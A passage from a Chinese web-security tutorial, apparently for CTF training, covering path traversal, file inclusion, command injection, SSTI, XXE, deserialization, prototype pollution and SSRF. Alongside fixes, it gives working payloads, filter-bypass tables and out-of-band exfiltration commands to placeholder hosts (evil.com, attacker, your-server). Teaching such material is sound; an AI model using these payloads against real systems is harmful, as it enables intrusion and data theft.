「用户能控制路径」听起来无害，但它同时意味着两件事：**能读到不该读的文件**（路径穿越），以及**能包含不该包含的文件**（文件包含，最终常常变成代码执行）。

**路径穿越：下载功能**

```php
<?php
// 设计意图：只允许下载 files/ 目录下的报告
$file = $_GET['file'];
readfile("./files/" . $file);
?>

# 正常：?file=report.pdf
# 攻击：?file=../../../../etc/passwd
# 攻击：?file=../../../../var/www/html/config.php   （读源码找数据库密码）
```

**过滤与绕过**

| 过滤方式 | 绕过写法 |
| --- | --- |
| 过滤 ../ | ....// （删掉 ../ 后剩下 ../）、..%2f、..%252f（二次解码） |
| 过滤绝对路径 | 不给绝对路径，用层层 ../ 走上去 |
| 只允许前缀目录 | ..\..\ （Windows 反斜杠）、%5c |
| 检查后缀 | a.php%00.jpg（老版本 PHP 截断）、路径末尾加点/空格（Windows） |
| WAF 拦 ../ | 编码变形：%2e%2e%2f、..%c0%af（畸形编码） |

**文件包含：把路径交给 include**

```php
<?php
$page = $_GET['page'];
include("./pages/" . $page . ".php");

// 正常：?page=about        -> include ./pages/about.php
// 读源码（不执行）：?page=php://filter/convert.base64-encode/resource=index
// 远程代码（需 allow_url_include=On）：?page=http://evil.com/shell.txt
// 日志包含：?page=../../../../var/log/apache2/access.log
?>
```

**PHP 伪协议速查**

| 协议 | 用途 | 前提 |
| --- | --- | --- |
| php://filter | 读文件源码（base64 编码后返回） | 任意 PHP 版本 |
| php://input | 读 POST 原始体，可配合 auto_prepend 执行 | allow_url_include=On |
| data:// | 把数据当文件包含，直接执行代码 | allow_url_include=On |
| expect:// | 直接执行命令 | 装了 expect 扩展 |
| http(s):// | 远程包含，代码在远程服务器上 | allow_url_include=On |
| zip:// / phar:// | 包含压缩包内文件；phar 还能触发反序列化 | 通常默认可用 |

**日志包含：把代码写进日志再包含它**

```bash
# 1. 让访问日志里出现 PHP 代码（UA 或 URL 里带）
curl -A "<?php system('id'); ?>" http://target/

# 2. 包含日志文件，代码被执行
?page=../../../../var/log/apache2/access.log
?page=../../../../var/log/nginx/access.log

# 也可以用 /proc/self/environ（环境变量里塞代码）
```

包含的利用深度完全取决于配置：`allow_url_include=On` 才能远程包含，`open_basedir` 会限制目录范围。所以拿到包含点后**先读 phpinfo 或配置，再决定用哪种方式**，不要一上来就试远程包含。

> 💡 修复其实很简单，两步：**用白名单映射**（请求的 key 对应固定的真实路径，而不是把用户输入拼进路径），**用 realpath 校验**（拼完之后解析出真实绝对路径，确认它仍在允许目录内）。文件包含还应禁用远程包含。

## 命令执行与代码执行

*约 40 分钟*

> 🎯 **本节目标**：分清「执行系统命令」和「执行语言代码」，掌握分隔符、过滤绕过与无回显处理。

这两类漏洞的注入内容不同：命令执行注入的是 **shell 语法**，代码执行注入的是 **目标语言的代码**。同一个输入口，后面挂的函数不同，利用方式就完全不同。

**两者的区别**

| 类型 | 典型函数 | 注入内容 | 例子 |
| --- | --- | --- | --- |
| 命令执行 | system / exec / shell_exec / passthru / 反引号 | shell 命令与分隔符 | 127.0.0.1; cat /flag |
| 代码执行 | eval / assert / create_function / preg_replace 的 /e | 目标语言代码 | phpinfo(); 或 system('cat /flag'); |

**漏洞代码与修复**

```php
<?php
// 危险：把用户输入拼进命令
$ip = $_GET['ip'];
system("ping -c 1 " . $ip);
//  ?ip=127.0.0.1; cat /flag
//  ?ip=127.0.0.1 | cat /flag

// 正确：先校验格式，再转义参数
if (!filter_var($ip, FILTER_VALIDATE_IP)) die("非法 IP");
system("ping -c 1 " . escapeshellarg($ip));
?>
```

**命令分隔与绕过**

| 被过滤的 | 替代写法 | 备注 |
| --- | --- | --- |
| 分隔符 ; | \|  \|\|  &  &&  换行(%0a) | 管道会把前面输出喂给后面 |
| 空格 | $IFS、%09、$IFS$9、{cat,/etc/passwd} | 花括号展开不需要空格 |
| 关键字 cat | ca""t、c\at、tac、nl、more、head | 引号和反斜杠插入 |
| 关键字 flag | /fl''ag、/fl\ag、通配符 /fl* | shell 会还原 |
| 路径 / | cd / && cat flag、$PWD 拼接 | 或者直接相对路径 |
| 命令回显被过滤 | 先写到文件再访问、外带 DNS/HTTP | 无回显场景 |

### 无回显的四种处理

1. **写文件**：`cat /flag > /var/www/html/1.txt`，再访问 `/1.txt`。
2. **带外 HTTP**：`curl http://your-server/?x=$(cat /flag | base64)`，在自己服务器上看日志。
3. **DNSLog**：`nslookup $(cat /flag).your.dnslog.cn`，用 DNS 查询把数据带出去（很多 WAF 允许出站 DNS）。
4. **时间侧信道**：`sleep $(cat /flag | cut -c1)`，靠响应时间判断一个字符（很慢，但什么通道都没有时能用）。

> 💡 最常见的误区：看到命令执行就急着 `cat /flag`。先确认三件事——**回显有没有、flag 在哪、有没有出网**。路径不对就先 `ls /`、`find / -name 'flag*'`。

## SSTI：模板注入

*约 35 分钟*

> 🎯 **本节目标**：能识别「用户输入被当模板解析」，知道 Jinja2/Twig/FreeMarker 的探测与利用思路。

模板引擎本来负责把数据填进 HTML。但如果你能把 `{{ ... }}` 之类的内容塞进模板**源码**，模板引擎就会把它当表达式求值——这就是 SSTI（服务端模板注入）。它通常来自「用用户输入拼模板」或「用模板引擎渲染用户提供的字符串」。

**漏洞是怎么产生的**

```php
<?php
// 危险：把用户输入当成模板源码渲染
$name = $_GET['name'];
echo $twig->render('Hello {{ name }}', ['name' => ...]);   // 安全（name 只是数据）

// 危险写法（很多教学题故意这么写）
echo $twig->createTemplate('Hello ' . $_GET['name'])->render([]);
// 输入 {{7*7}} 就会输出 49
?>
```

**一句话判断有没有 SSTI**

| 输入 | 回显 | 说明 |
| --- | --- | --- |
| {{7*7}} | 49 | Jinja2（Python）、Twig（PHP）、Spring 的 Thymeleaf 类 |
| ${7*7} | 49 | FreeMarker（Java）、部分 Thymeleaf 表达式 |
|  | 49 | ERB（Ruby） |
| #{7*7} | 49 | Ruby 插值、部分 Java 表达式语言 |
| ${7*7} 或 {{7*7}} 无变化 | 原样 | 可能被转义，或没有 SSTI |

**Jinja2（Flask）常见探测与利用思路**

```python
# 1. 确认模板引擎
{{7*7}}

# 2. 看配置（Flask 的 config 对象是全局的）
{{ config }}
{{ config.items() }}

# 3. 从内置对象出发，找能执行命令的类
{{ ''.__class__.__mro__[1].__subclasses__() }}
# 在返回的大列表里找 Popen / os 相关类，再调用
{{ ''.__class__.__mro__[1].__subclasses__()[<下标>]('id',shell=True).communicate() }}

# 4. 常见过滤绕过思路
#   .__ 被过滤   -> 用 attr 过滤器：{{ 'a'.__class__ }} 换成 {{ 'a'|attr('__class__') }}
#   [] 被过滤    -> 用 ( ) 调用的等价方式
#   关键字被过滤 -> 用字符串拼接或 request.args 传参
```

**算一下探测链的原理**

```python
# ''.__class__            -> <class 'str'>
# ''.__class__.__mro__    -> (str, object)   找基类
# [1] 就是 object
# object.__subclasses__() -> 所有已加载的子类
# 目标：找到能执行命令的类（如 subprocess.Popen）或能读文件的类
#
# 所以整条链是：字符串对象 -> 它的类 -> 基类 -> 全部子类 -> 挑一个危险类 -> 调用
```

> 💡 SSTI 的利用链和「沙箱里有什么对象」强相关：同一个 payload 在本地能跑，在题目里可能因为禁了某个类就失效。所以必须**有源码就看源码，没源码就逐个探测**——这是最依赖「读源码」能力的一类题。

### 修复

- 用户输入永远只作为**模板变量**传入，不要拼进模板源码。
- 必须动态渲染时，用沙箱化模板（如 Jinja2 SandboxedEnvironment）并限制可用对象。
- 把模板引擎的调试模式关掉；错误信息不要直接回显。
- 限制模板能访问的对象：传入 `autoescape=True`，禁用 `__` 属性访问。

## XXE：XML 外部实体

*约 30 分钟*

> 🎯 **本节目标**：理解 XML 实体为什么能读文件、打内网，以及盲 XXE 的带外思路。

XML 允许在 DOCTYPE 里定义「实体」，实体的值可以是一个外部 URI。解析器读到 `&xxe;` 时，会去读取那个 URI 指向的内容并替换进来——如果这个 URI 是 `file:///etc/passwd`，服务端文件就被读出来了。

**最小 PoC（有回显）**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><name>&xxe;</name></root>
```

**盲 XXE：把内容带外**

```xml
<!-- 页面不回显，用外部 DTD 把读到的内容拼进请求发给攻击者 -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
  %dtd;
]>

<!-- evil.dtd 内容：把 %file 的内容塞进 URL 参数，向攻击者发起请求 -->
<!-- <!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker/?d=%file;'>"> %all; -->
```

**XXE 的三种打法**

| 场景 | 手法 | 前提 |
| --- | --- | --- |
| 有回显 | 直接 &xxe; 读文件 | 解析结果的字段被显示出来 |
| 无回显 | 外部 DTD 把内容带外（OOB） | 服务器能主动访问外网（DNS/HTTP） |
| 无外网 | 报错信息带出（error-based） | 报错被回显，且实体能被拼进报错 |
| 打内网 | ENTITY 指向内网 http 服务，做 SSRF | 服务器能访问内网 |

**进阶：读 PHP 源码（绕过 filter 限制）**

```xml
<!-- 读不到文件时，用 php://filter 让文件内容变成 base64 再带出 -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
]>
<root><name>&xxe;</name></root>
```

**前提条件**：服务的 XML 解析器允许外部实体。PHP 的 libxml 2.9 以前默认开启，之后默认关闭（但代码里用 `LIBXML_NOENT` 等选项仍可能打开）。Java 的 DocumentBuilderFactory 默认也有此问题，需要手动关闭。

### 修复

- 禁用 DTD 与外部实体：PHP 用 libxml_disable_entity_loader(true)（旧版），新环境用 `LIBXML_NONET`。
- Java：`factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`。
- Python：lxml 用 `resolve_entities=False`；defusedxml 直接替换标准库解析器。
- 实在不需要 XML 就换成 JSON。

## 反序列化（PHP）：魔术方法与 pop 链

*约 40 分钟*

> 🎯 **本节目标**：看懂 PHP 序列化字符串，理解魔术方法如何被串成利用链（pop chain）。

序列化是把对象变成字符串，反序列化是把字符串还原成对象。危险点在于：**反序列化一个可控的字符串，等于让攻击者构造对象。**而对象在被创建、销毁、被当字符串用时，会自动触发魔术方法——这些魔术方法里如果有危险函数，就有了链。

**序列化格式**

```php
<?php
class A { public $cmd = "whoami"; }
echo serialize(new A());
// O:1:"A":1:{s:3:"cmd";s:6:"whoami";}

// O: 对象  s: 字符串  i: 整数  a: 数组  b: 布尔  N: null
// 数字是长度，必须完全匹配，否则解析失败
// -> 这也是绕过技巧：改长度/属性个数，让 __wakeup 前的解析行为变化
?>
```

**魔术方法 = 链上的触发点**

```php
__construct()   new 时调用（反序列化时不触发）
__wakeup()      反序列化时立刻调用
__destruct()    对象销毁时调用
__toString()    被当字符串用时调用（echo / 拼接）
__call()        调用不存在的方法时
__get()/__set() 访问不存在属性时
__sleep()       序列化时调用
__invoke()      对象被当函数调用时

// 典型链：unserialize 入口 -> __wakeup -> ... -> __destruct -> 危险函数
```

**一个最小的利用链**

```php
<?php
class Start {
    public $obj;
    function __destruct() {
        $this->obj->run();      // 销毁时调用 obj 的 run()
    }
}
class Exec {
    public $cmd;
    function run() {
        eval($this->cmd);        // 危险函数
    }
}
// 构造：让 Start.obj 指向 Exec，并把 cmd 设成我们的代码
$payload = new Start();
$payload->obj = new Exec();
$payload->obj->cmd = "system('id');";
echo serialize($payload);
// 提交这串字符串给 unserialize() 即可执行
?>
```

### 找链的方法（重点）

1. 先找入口：代码里哪里调用了 `unserialize()`，参数是否可控。
2. 列出所有魔术方法：每个类里有哪些 `__wakeup` / `__destruct` / `__toString`。
3. 从魔术方法里找「能被我控制的方法调用」：`$this->x->y()` 这种，x 可控就能换类。
4. 顺着调用走，直到遇到危险函数（eval、system、include、文件写）。
5. 把路径上的属性值按顺序填好，序列化出来提交。
6. 工具：phpggc 可以生成常见框架的链（ThinkPHP、Laravel、Guzzle）。

**常见过滤与绕过**

| 过滤 | 绕过思路 |
| --- | --- |
| 过滤 O: 开头 | 用 a: 数组嵌套对象；或用 C: 自定义序列化 |
| 过滤 "类名" | 大小写、字符串偏移、PHP 7.4 的 C: 格式 |
| 校验属性个数 | 改 O:1:"A":1: 里的 1 为 2（旧版 PHP 会跳过 __wakeup 的某些检查） |
| __wakeup 里 die | 用 __destruct 链，或触发其他魔术方法 |

> 💡 反序列化不是「背 payload」，而是**读代码找路径**。真正的题目里类都藏在框架源码里，所以要会顺着 composer.json 找依赖、顺着自动加载找类文件。

## 反序列化（Python）：pickle 与对象图

*约 35 分钟*

> 🎯 **本节目标**：能解释 pickle 为什么能执行代码，分清 Python 对象图与 JS 原型链的区别，知道 safe_load / RestrictedUnpickler 的边界。

先纠正一个容易混的说法：**Python 没有 JS 那种原型链**，把 prototype pollution 的术语硬套到 Python 上会越学越乱。Python 的反序列化问题来自另一件事：**pickle 在还原对象时，会按照字节流里的指令重建对象、导入模块、调用可调用对象**。用户可控的字节被还原成对象图，就等于把「构造对象」的权力交给了攻击者。

**最小原理：__reduce__ 决定怎么还原**

```python
import pickle, os

class Evil:
    def __reduce__(self):
        # 反序列化时，pickle 会调用 os.system("id")
        return (os.system, ("id",))

payload = pickle.dumps(Evil())
pickle.loads(payload)      # 还原的那一刻执行命令
```

`__reduce__` 只是最直观的入口。真实题目里，危险点可能是 `yaml.load`、`joblib.load`、Flask 的缓存、Celery 任务、机器学习模型。共同点只有一个：**不可信字节被当成了对象图**。

**别把概念混在一起：JS 与 Python 对照**

| 你听到的说法 | JS 里是什么 | Python 里对应什么 |
| --- | --- | --- |
| 原型链污染 | `__proto__` / `Object.prototype` | 没有原型链；对应对象图、MRO、子类遍历 |
| 沙箱逃逸 | vm / prototype gadget | `__class__.__mro__.__subclasses__()`、pickle gadget |
| 反序列化 | JSON 本身不执行；node-serialize 等库才危险 | pickle / yaml.load / joblib / torch.load |
| 模板注入 | EJS / Pug 等模板 | Jinja2 表达式求值（SSTI，不是反序列化） |

### 怎么找入口

1. 全局搜 `pickle.loads`、`pickle.load`、`yaml.load`、`joblib.load`、`torch.load`。
2. 看数据是否可控：Cookie、上传文件、缓存、队列消息、模型文件。
3. 看有没有安全替代：`yaml.safe_load`、`RestrictedUnpickler`、HMAC 签名。
4. 看版本与依赖：老版本库可能默认不安全，或存在已知 gadget。
5. 确认「还原时到底调用了什么」——这才是根因，不是 payload 长什么样。

**安全与不安全的写法**

```python
import yaml, pickle

# ❌ 不安全：yaml.load 可以构造任意 Python 对象
data = yaml.load(untrusted, Loader=yaml.Loader)

# ✅ 安全：只解析基础类型
data = yaml.safe_load(untrusted)

# ✅ 如果必须用 pickle：白名单类 + 签名校验
class SafeUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if (module, name) not in ALLOWED:
            raise pickle.UnpicklingError("blocked")
        return super().find_class(module, name)
```

### 修复

- 能不反序列化就不反序列化：跨边界优先用 JSON。
- 必须用 YAML 时用 `safe_load`；必须用 pickle 时用白名单 `RestrictedUnpickler`。
- 给序列化数据加 HMAC 签名，验证来源后再还原。
- 不要反序列化用户上传的模型/缓存/队列消息；隔离解析进程与权限。
- 升级依赖，排查历史上默认不安全的库。

> 💡 Python 的 SSTI 也会走 `__class__.__mro__`，但那是**模板表达式求值**，不是反序列化。两者都涉及对象图，别混为一谈——这也是「按诞生地学」比「按 payload 学」更清楚的原因。

## 反序列化（Java）：readObject 与组件链

*约 40 分钟*

> 🎯 **本节目标**：知道 Java 反序列化的入口、识别组件与版本，理解 ysoserial 与 JNDI 注入。

Java 的反序列化问题更「工程化」：入口很多，利用链大多来自第三方库（CommonsCollections 等），所以题目的难点是**识别组件和版本**，而不是从零构造链。

**Java 反序列化的入口**

```
ObjectInputStream.readObject()

常见的数据位置：
- Cookie / Header：rememberMe、X-Auth 等 base64 字段
- 表单参数：base64 后的序列化字节（开头是 rO0AB）
- RMI / RPC / JNDI 调用
- 框架内部：Shiro、Fastjson、Jackson、XStream
```

**常见利用链家族**

| 组件 | 利用链 | 特征 |
| --- | --- | --- |
| CommonsCollections 3.x | CC1 / CC3 / CC5 / CC6 / CC7 | commons-collections.jar 版本 |
| CommonsBeanutils | CB1 | commons-beanutils.jar |
| Shiro | rememberMe 反序列化 | Cookie 里有 rememberMe=deleteMe 或 base64 大串 |
| Fastjson | autoType 绕过 | JSON 里 @type 字段 |
| Log4j2 | JNDI 注入（log4shell） | 日志里出现 ${jndi:ldap://...} |
| Jackson | 多态反序列化 | enableDefaultTyping 配置 |

### 做题流程

1. 看到 `rO0AB` 开头的 base64，或名为 rememberMe 的 Cookie，基本可以确定是 Java 反序列化。
2. 去找组件：能读源码就看 pom.xml / build.gradle / Web-INF/lib；不能读就靠报错、栈信息、页面指纹。
3. 确定版本区间：同一家族的不同版本对应不同链（如 CC3 与 CC1 的 payload 不同）。
4. 用 ysoserial 生成对应链的 payload，做 base64 后提交。
5. JNDI 类场景，改用 ldap/rmi 外部服务接收请求（JNDIExploit、rogue-jndi）。

**ysoserial 基本用法**

```bash
# 生成 CC1 链的 payload（执行命令）
java -jar ysoserial.jar CommonsCollections1 "touch /tmp/pwned" > payload.bin

# base64 后提交
base64 -w0 payload.bin

# 常见链名
# CommonsCollections1/3/5/6/7、CommonsBeanutils1、URLDNS（只做探测）
```

> 💡 Java 题最省时间的判断：**先看有没有 rO0AB / rememberMe / Fastjson 的 @type**。有就直接走对应链，没有就去读依赖列表。版本号决定了用哪条链，这一步错了 payload 一定打不通。

## 原型链污染

*约 35 分钟*

> 🎯 **本节目标**：理解 Object.prototype 被污染后为什么会影响全局，以及常见入口与危害。

JavaScript 里所有普通对象都继承自 `Object.prototype`。如果你能把一个属性写进这个「公共祖先」，那么之后**任何**对象访问这个属性都会拿到它——即使你根本没在自己身上定义过。很多「深拷贝 / 合并配置」的函数就会无意中提供这个写入能力。

**漏洞原理（不安全的 merge）**

```js
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === "object") {
      target[key] = target[key] || {};
      merge(target[key], source[key]);   // ← 没有过滤 __proto__
    } else {
      target[key] = source[key];
    }
  }
}

merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
console.log({}.isAdmin);   // true  —— 所有对象都被污染了
```

**为什么「所有对象」都受影响**

```js
// 每个对象字面量 { } 的原型都是 Object.prototype
const a = {};
const b = {};        // a、b、c 都共享同一个 Object.prototype
console.log(a.isAdmin);  // true
console.log(b.isAdmin);  // true

// prototype vs __proto__
// Foo.prototype           : 构造函数的「原型对象」，给它加属性影响所有实例
// obj.__proto__           : 对象自身指向的原型（通常就是 Foo.prototype）
// 所以 obj.__proto__.x = 1  等价于给原型链上层加属性
```

**常见入口与危害**

| 入口 | 说明 |
| --- | --- |
| JSON 参数合并 | 如要求前端把配置对象 POST 上来，后端 deepMerge |
| URL 参数解析 | qs 库老版本对 a[__proto__][x]=1 的解析 |
| 模板引擎配置合并 | 污染 options 影响后续渲染 |
| 危害：模板注入 | 污染模板引擎的设置，导致代码执行 |
| 危害：沙箱逃逸 | 污染子进程选项（如 shell、env） |
| 危害：绕过校验 | 污染 isAdmin 之类的判断字段 |

### 怎么修

- 合并前过滤键：拒绝 `__proto__`、`constructor`、`prototype`。
- 用 `Object.create(null)` 创建无原型对象存放配置。
- 用 `Object.defineProperty` 定义属性，或用 `Map` 代替普通对象。
- 依赖库要升级：lodash、qs 等历史版本已有修复。
- 解析 JSON 后做一次递归的白名单过滤。

> 💡 原型链污染题在 Node.js 方向很常见。判断方法：**找「合并 / 深拷贝」的入口**；利用的关键是「污染完能不能影响后续某个危险操作」，单靠污染本身通常没意义。

## SSRF：让服务器替你访问

*约 40 分钟*

> 🎯 **本节目标**：理解 SSRF 的三种用途（内网探测、读文件、打内网应用），掌握常见过滤的绕过。

SSRF（Server-Side Request Forgery）的本质：**服务器会去访问你给的地址，而你给了一个它本不该访问的地址。**它的价值在于「绕过防火墙」——你从外网连不进去的内网服务，服务器能连。

**典型漏洞代码**

```php
<?php
// 功能：图片加载 / URL 预览 / 远程下载
$url = $_GET['url'];
echo file_get_contents($url);

// 正常：?url=https://example.com/a.png
// 攻击：?url=http://127.0.0.1/admin          （访问本机管理后台）
// 攻击：?url=file:///etc/passwd               （读本地文件）
// 攻击：?url=http://169.254.169.254/latest/meta-data/   （云元数据）
?>
```

**协议与用途**

| 协议 | 用途 | 说明 |
| --- | --- | --- |
| http / https | 打内网 Web 服务 | 最常见 |
| file:// | 读本地文件 | PHP 默认允许 |
| dict:// | 探测端口、打 Redis/Memcached | dict://127.0.0.1:6379/info |
| gopher:// | 构造任意 TCP 报文（打 Redis、MySQL、FastCGI） | 能发原始字节，利用面最广 |
| ftp:// / tftp:// | 探测内网文件服务 | 有时可用 |

### 判断 SSRF 是否存在

1. 找一个「服务器会访问 URL」的功能：图片加载、URL 预览、webhook、远程下载、PDF 生成。
2. 喂一个自己控制的地址（或 dnslog.cn），看服务器有没有回连——有回连就是 SSRF。
3. 试 `http://127.0.0.1:端口` 扫内网端口：响应时间/内容不同就是服务存活。
4. 试 `file:///etc/passwd` 读文件；试 `http://169.254.169.254/` 读云元数据。
5. 拿到 Redis / MySQL 之类内网服务时，用 gopher 构造报文打（这一层属于进阶）。

**gopher 打 Redis 的思路**

```bash
# Redis 未授权：直接写 webshell 或写 crontab
# gopher 报文体需要把命令转成 Redis 协议（RESP）再做 URL 编码
# 常用工具：Gopherus、SSRFmap

# 简化示意：gopher://127.0.0.1:6379/_<URL编码后的RESP>
# 关键命令序列：CONFIG SET dir /var/www/html -> CONFIG SET dbfilename 1.php -> SET x "<?php ...?>" -> SAVE
```

**常见过滤与绕过**

| 过滤方式 | 绕过写法 |
| --- | --- |
| 过滤 127.0.0.1 | 127.1、0.0.0.0、[::1]、2130706433、0x7f000001、127.0.0.1.nip.io |
| 过滤 localhost | 同上，或 DNS 重绑定（第一次解析公网 IP 过校验，第二次解析内网） |
| 只允许 http:// | 302 跳转绕过：自己的服务器跳回内网地址 |
| 校验 URL 前缀 | user@host 形式：http://expected.com@evil.com/ |
| 校验 host 但没校验端口 | 直接换端口找内网服务 |
| 禁 file 协议 | 用 gopher / dict 曲线读文件或打服务（取决于库） |

**修复：白名单 + 解析后校验**

```php
<?php
// 1. 只允许明确需要的协议
$scheme = parse_url($url, PHP_URL_SCHEME);
if (!in_array($scheme, ['http', 'https'])) die("协议不允许");

// 2. 解析域名成 IP，再判断是不是内网地址
$host = parse_url($url, PHP_URL_HOST);
$ip = gethostbyname($host);
if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
    die("内网地址不允许");
}

// 3. 禁止跟随跳转（curl: CURLOPT_FOLLOWLOCATION => false）
// 4. 出站流量走统一代理，在代理层做白名单
?>
```

> 💡 SSRF 的修复比利用更难：因为「解析」和「连接」之间有时间差（DNS 重绑定就利用这一点）。生产上最可靠的做法是**出站白名单代理**，而不是在代码里做黑名单过滤。
